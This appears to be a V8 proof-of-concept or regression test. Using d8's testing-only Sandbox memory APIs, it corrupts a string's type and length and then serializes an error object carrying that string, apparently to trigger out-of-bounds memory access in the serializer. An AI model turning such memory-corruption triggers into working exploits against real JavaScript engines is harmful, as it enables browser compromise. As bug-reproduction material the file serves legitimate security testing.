let sbx_memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
Sandbox.getAddressOf(sbx_memory);

let err_msg = "AAAABBBB";
let stack_trace = "CCCCDDDD";

const v3 = URIError(err_msg);
v3.stack = stack_trace;

const addr = Sandbox.getAddressOf(stack_trace);
// Make the string a TwoByteString
sbx_memory.setUint32(addr, 0x4a, true);
// Set the length of the string.
sbx_memory.setUint32(addr + 8, 0xffffffd5, true);

d8.serializer.serialize(v3);

